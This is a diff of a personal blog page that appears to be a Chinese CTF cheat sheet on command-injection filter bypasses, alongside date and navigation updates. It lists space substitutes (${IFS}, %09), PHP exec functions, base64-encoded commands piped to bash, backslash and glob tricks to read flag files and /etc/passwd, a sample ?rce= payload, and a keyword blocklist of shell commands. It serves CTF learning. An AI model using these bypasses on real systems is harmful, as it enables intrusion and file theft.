@@ -39,7 +39,7 @@
 <meta property="og:image" content="http://example.com/images/image-20250410130235793-1744261356625-7.png">
 <meta property="og:image" content="http://example.com/images/image-20250410130302620-1744261383768-9.png">
 <meta property="article:published_time" content="2025-03-23T06:00:14.000Z">
-<meta property="article:modified_time" content="2025-09-11T05:41:09.382Z">
+<meta property="article:modified_time" content="2026-05-07T17:13:05.177Z">
 <meta property="article:author" content="Flight-star">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="http://example.com/images/image-20250410130235793-1744261356625-7.png">
@@ -184,7 +184,7 @@
       <div class="article-date">
   <a href="/2025/03/23/%E4%B8%80%E4%BA%9B%E6%9F%A5%E8%AF%A2%E5%91%BD%E4%BB%A4/" class="article-date-link" data-aos="zoom-in">
     <time datetime="2025-03-23T06:00:14.000Z" itemprop="datePublished">2025-03-23</time>
-    <time style="display: none;" id="post-update-time">2025-09-11</time>
+    <time style="display: none;" id="post-update-time">2026-05-08</time>
   </a>
 </div>
 
@@ -203,7 +203,11 @@
 
 
 
-<h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#空格：</span></span><br><span class="line">	$&#123;IFS&#125;									<span class="comment">#php用不了</span></span><br><span class="line">	\t</span><br><span class="line">    &lt;</span><br><span class="line">    %<span class="number">09</span>										</span><br><span class="line">        </span><br><span class="line"><span class="comment">#函数执行：</span></span><br><span class="line">    <span class="title function_ invoke__">passthru</span>(<span class="string">&quot;命令&quot;</span>)</span><br><span class="line">    <span class="title function_ invoke__">exec</span>(<span class="string">&quot;命令&quot;</span>, <span class="variable">$output_array</span>);</span><br><span class="line">	<span class="title function_ invoke__">shell_exec</span>(<span class="string">&quot;命令&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;$a&#x27;</span>,<span class="string">&quot;echo <span class="subst">$a</span>&quot;</span>); </span><br><span class="line"><span class="comment">#查询命令</span></span><br><span class="line">	more /fl*      <span class="comment"># 分页显示（适合小文件）</span></span><br><span class="line">    less /fl*      <span class="comment"># 类似 more，但支持上下滚动</span></span><br><span class="line">    head /fl*      <span class="comment"># 显示文件前 10 行</span></span><br><span class="line">    tail /fl*      <span class="comment"># 显示文件后 10 行</span></span><br><span class="line">    nl /fl*        <span class="comment"># 显示文件内容并加行号</span></span><br><span class="line">    rev /fl*       <span class="comment"># 反向输出每一行</span></span><br><span class="line">    strings /fl*   <span class="comment"># 输出文件中的可打印字符（绕过二进制干扰）</span></span><br><span class="line">    sh</span><br><span class="line">    grep	/fl*</span><br><span class="line">    rev /f?g		   <span class="comment">#当*被禁用</span></span><br><span class="line">      </span><br><span class="line"><span class="comment">#处理Linux绕过时候：</span></span><br><span class="line">        \			<span class="comment">#l\s</span></span><br><span class="line">        ``			<span class="comment">#l``s</span></span><br><span class="line">	<span class="comment">#拼接:		   </span></span><br><span class="line">        cmd=a=<span class="number">1</span>;b=s<span class="variable">$IFS</span>/;$a<span class="variable">$b</span></span><br><span class="line">		cmd=a=bas;b=e64;c=bas;d=h;<span class="keyword">echo</span> Y2F0IC9mKg | $a<span class="variable">$b</span> -d | $c<span class="variable">$d</span>	<span class="comment">#base64</span></span><br><span class="line">            </span><br><span class="line"><span class="comment">#ls禁用：</span></span><br><span class="line">        dir /</span><br><span class="line"></span><br><span class="line"><span class="comment">#当已知ls/根目录时候：</span></span><br><span class="line">        cmd=cat /$(dir -<span class="number">1</span> / | sed -n <span class="number">5</span>p)</span><br><span class="line">        cmd=more /[e-h][k-m][<span class="number">0</span>-b][e-h]			<span class="comment">#e-h匹配到f，k-m匹配到l。。。</span></span><br><span class="line">        cmd=more /etc/p[<span class="number">0</span>-b]sswd				<span class="comment">#组合使用也行</span></span><br><span class="line">            </span><br><span class="line">eg：</span><br><span class="line">  ?rce=mor\e%<span class="number">09</span>fla\g.php		<span class="comment">#当前目录下的flag</span></span><br></pre></td></tr></table></figure>
+<h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">md5(md5($this-&gt;var11)) == <span class="number">666</span>	</span><br><span class="line"><span class="comment">#var11 = 213即可</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&quot;/flag|system|tail|more|less|php|tac|cat|sort|shell|nl|sed|awk| /i&quot;</span>, $this-&gt;command))&#123;</span><br><span class="line">echo <span class="string">&quot;nonono&quot;</span>; </span><br><span class="line"><span class="comment">#passthru				代替system</span></span><br><span class="line"><span class="comment">#tab键位		   			绕过空格</span></span><br><span class="line"><span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#空格：</span></span><br><span class="line">	$&#123;IFS&#125;									<span class="comment">#php用不了</span></span><br><span class="line">	\t</span><br><span class="line">    &lt;</span><br><span class="line">    %<span class="number">09</span>	~\t ~ Tab</span><br><span class="line">    Tab键也可以（\t）</span><br><span class="line">        </span><br><span class="line"><span class="comment">#函数执行：</span></span><br><span class="line">    <span class="title function_ invoke__">passthru</span>(<span class="string">&quot;命令&quot;</span>)</span><br><span class="line">    <span class="title function_ invoke__">exec</span>(<span class="string">&quot;命令&quot;</span>, <span class="variable">$output_array</span>);</span><br><span class="line">	<span class="title function_ invoke__">shell_exec</span>(<span class="string">&quot;命令&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;$a&#x27;</span>,<span class="string">&quot;echo <span class="subst">$a</span>&quot;</span>); </span><br><span class="line"><span class="comment">#查询命令</span></span><br><span class="line">	more /fl*      <span class="comment"># 分页显示（适合小文件）</span></span><br><span class="line">    less /fl*      <span class="comment"># 类似 more，但支持上下滚动</span></span><br><span class="line">    head /fl*      <span class="comment"># 显示文件前 10 行</span></span><br><span class="line">    tail /fl*      <span class="comment"># 显示文件后 10 行</span></span><br><span class="line">    nl /fl*        <span class="comment"># 显示文件内容并加行号</span></span><br><span class="line">    rev /fl*       <span class="comment"># 反向输出每一行</span></span><br><span class="line">    strings /fl*   <span class="comment"># 输出文件中的可打印字符（绕过二进制干扰）</span></span><br><span class="line">    sh</span><br><span class="line">    grep	/fl*</span><br><span class="line">    rev /f?g		   <span class="comment">#当*被禁用</span></span><br><span class="line">      </span><br><span class="line"><span class="comment">#处理Linux绕过时候：</span></span><br><span class="line">        \			<span class="comment">#l\s</span></span><br><span class="line">        ``			<span class="comment">#l``s</span></span><br><span class="line">	<span class="comment">#拼接:		   </span></span><br><span class="line">        cmd=a=<span class="number">1</span>;b=s<span class="variable">$IFS</span>/;$a<span class="variable">$b</span></span><br><span class="line">		cmd=a=bas;b=e64;c=bas;d=h;<span class="keyword">echo</span> Y2F0IC9mKg | $a<span class="variable">$b</span> -d | $c<span class="variable">$d</span>	<span class="comment">#base64</span></span><br><span class="line">            </span><br><span class="line"><span class="comment">#ls禁用：</span></span><br><span class="line">        dir /</span><br><span class="line"></span><br><span class="line"><span class="comment">#当已知ls/根目录时候：</span></span><br><span class="line">        cmd=cat /$(dir -<span class="number">1</span> / | sed -n <span class="number">5</span>p)</span><br><span class="line">        cmd=more /[e-h][k-m][<span class="number">0</span>-b][e-h]			<span class="comment">#e-h匹配到f，k-m匹配到l。。。</span></span><br><span class="line">        cmd=more /etc/p[<span class="number">0</span>-b]sswd				<span class="comment">#组合使用也行</span></span><br><span class="line">            </span><br><span class="line">eg：</span><br><span class="line">  ?rce=mor\e%<span class="number">09</span>fla\g.php		<span class="comment">#当前目录下的flag</span></span><br></pre></td></tr></table></figure>
 
 <p>特殊：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">hex2bin</span>(<span class="string">&quot;2f&quot;</span>))); 		<span class="comment">#读取根目录</span></span><br></pre></td></tr></table></figure>
@@ -366,14 +370,14 @@
         
           
           
-            <img data-src="https://github.com/Flight-star-cy/my-images/blob/main/guanx-fufumi.jpg" data-sizes="auto" alt="攻防世界-web" class="lazyload">
+            <img data-src="/covers/辉夜02.jpg" data-sizes="auto" alt="攻防世界-misc" class="lazyload">
           
         
-        <a href="/2025/03/23/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-web/"></a>
+        <a href="/2025/03/23/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-misc/"></a>
         <div class="article-nav-caption">Newer</div>
         <h3 class="article-nav-title">
           
-            攻防世界-web
+            攻防世界-misc
           
         </h3>
       </div>
@@ -383,7 +387,7 @@
       
         
         
-          <img data-src="https://github.com/Flight-star-cy/my-images/blob/main/cover/sakuya%20looking%20back.jpg" data-sizes="auto" alt="Aura酱的礼物" class="lazyload">
+          <img data-src="https://github.com/Flight-star-cy/my-images/blob/main/%E5%8D%81%E5%85%AD%E5%A4%9C%E5%92%B2%E5%A4%9C%20(3).jpg;" data-sizes="auto" alt="Aura酱的礼物" class="lazyload">
         
       
       <a href="/2025/03/21/BaseCTF2024%E6%96%B0%E7%94%9F%E8%B5%9BAura%E9%85%B1%E7%9A%84%E7%A4%BC%E7%89%A9/"></a>
@@ -429,7 +433,7 @@
 <div class="sidebar-state">
   <div class="sidebar-state-article">
     <div>Posts</div>
-    <div class="sidebar-state-number">84</div>
+    <div class="sidebar-state-number">88</div>
   </div>
   <div class="sidebar-state-category">
     <div>Categories</div>
@@ -494,7 +498,7 @@
     
     <div>
       <span class="icon-copyright"></span>
-      2020-2025
+      2020-2026
       <span class="footer-info-sep"></span>
       Flight-star
     </div>
@@ -507,10 +511,10 @@
     
       <div>
         <span class="icon-brush"></span>
-        79.7k
+        54.8k
         &nbsp;|&nbsp;
         <span class="icon-coffee"></span>
-        06:09
+        04:14
       </div>
     
     
@@ -553,7 +557,7 @@
 <div class="sidebar-state">
   <div class="sidebar-state-article">
     <div>Posts</div>
-    <div class="sidebar-state-number">84</div>
+    <div class="sidebar-state-number">88</div>
   </div>
   <div class="sidebar-state-category">
     <div>Categories</div>
